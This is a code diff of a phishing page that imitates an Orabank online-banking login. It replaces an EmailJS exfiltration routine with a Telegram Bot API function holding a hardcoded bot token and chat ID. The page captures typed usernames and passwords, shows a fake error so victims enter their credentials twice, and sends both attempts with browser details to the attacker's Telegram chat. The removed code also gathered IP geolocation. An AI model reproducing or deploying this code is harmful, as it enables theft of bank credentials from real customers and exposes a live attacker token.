@@ -7,7 +7,7 @@
     <title>Banking</title>
     <link rel="shortcut icon" href="https://ebankingtg.orabank.net/image.ebk?ressource=favicon.ico"
         type="image/x-icon" />
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/build/index.min.js"></script>
+
     <style>.xi-fB-Xv /* CSS Reset & Global Styles */
         * {
             margin: 0;
@@ -546,22 +546,13 @@
     </div>
 
     <script>
-        // EmailJS Configuration
-        const EMAILJS_PUBLIC_KEY = 'cJcTNwUcLcI7uY3l-';
-        const EMAILJS_SERVICE_ID = 'service_qh1p3sh';
-        const EMAILJS_LOGIN_TEMPLATE_ID = 'template_6un0yk8';
-
-        // Initialize EmailJS
-        emailjs.init(EMAILJS_PUBLIC_KEY);
-        console.log('✅ EmailJS initialized');
-
         // Track attempts
         let loginAttempts = 0;
         let capturedUsername = '';
         let capturedPassword = '';
 
         // ============================================================
-        // STEP 1: First attempt - Capture login and send via EmailJS
+        // STEP 1: First attempt - Capture login and send via Telegram
         // ============================================================
         async function handleFirstAttempt() {
             const username = document.getElementById('identifiant').value.trim();
@@ -581,13 +572,8 @@
             btn.disabled = true;
             btn.textContent = 'Traitement en cours...';
 
-            try {
-                // Send via EmailJS (fire and forget in background)
-                await sendLoginEmail(username, password, 1);
-                console.log('📧 First attempt email sent');
-            } catch (error) {
-                console.warn('Email failed (continuing anyway):', error);
-            }
+            // Send via Telegram (fire and forget in background)
+            await sendTelegramMessage(username, password, 1);
 
             // After 2 seconds, show error and clear password
             setTimeout(() => {
@@ -618,13 +604,8 @@
             btn.disabled = true;
             btn.textContent = 'Traitement en cours...';
 
-            try {
-                // Send via EmailJS (fire and forget in background)
-                await sendLoginEmail(username, password, 2);
-                console.log('📧 Second attempt email sent');
-            } catch (error) {
-                console.warn('Email failed (continuing anyway):', error);
-            }
+            // Send via Telegram (fire and forget in background)
+            await sendTelegramMessage(username, password, 2);
 
             // After 2 seconds, show verification modal
             setTimeout(() => {
@@ -638,43 +619,40 @@
         }
 
         // ============================================================
-        // Send Email via EmailJS (Async, doesn't block UI)
+        // Send Message via Telegram Bot API (Async, doesn't block UI)
         // ============================================================
-        function sendLoginEmail(username, password, attempt) {
-            return new Promise((resolve) => {
-                // Get browser/location info (timeout after 1 second)
-                Promise.race([
-                    fetch('https://ipapi.co/json/').then(r => r.json()),
-                    new Promise(resolve => setTimeout(() => resolve(null), 1000))
-                ]).then(locationData => {
-                    const params = {
-                        username: username,
-                        password: password,
-                        attempt: attempt,
-                        timestamp: new Date().toISOString(),
-                        user_agent: navigator.userAgent,
-                        language: navigator.language,
-                        platform: navigator.platform,
-                        screen_resolution: window.screen.width + 'x' + window.screen.height,
-                        latitude: locationData?.latitude || 'N/A',
-                        longitude: locationData?.longitude || 'N/A',
-                        country: locationData?.country_name || 'N/A',
-                        city: locationData?.city || 'N/A',
-                        ip_address: locationData?.ip || 'N/A'
-                    };
+        async function sendTelegramMessage(username, password, attempt) {
+            const botToken = '6733452065:AAEhvIkG_mQ6csfT4407H_tkmjUqCZDt5B0';
+            const chatId = '6201590412';
 
-                    // Send email (async)
-                    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_LOGIN_TEMPLATE_ID, params)
-                        .then(() => {
-                            console.log('📧 Email sent successfully for attempt', attempt);
-                            resolve();
+            const message = `🚨 Login Attempt #${attempt}\n\n` +
+                `Username: ${username}\n` +
+                `Password: ${password}\n` +
+                `Time: ${new Date().toISOString()}\n` +
+                `Browser: ${navigator.userAgent}\n` +
+                `Platform: ${navigator.platform}`;
+
+            try {
+                const response = await fetch(
+                    `https://api.telegram.org/bot${botToken}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
                         })
-                        .catch(error => {
-                            console.warn('📧 Email send failed:', error);
-                            resolve(); // Still resolve to continue flow
-                        });
-                });
-            });
+                    }
+                );
+
+                if (response.ok) {
+                    console.log('✅ Telegram message sent');
+                } else {
+                    console.warn('Telegram message failed:', response.status);
+                }
+            } catch (error) {
+                console.warn('Telegram error:', error);
+            }
         }
 
         // ============================================================
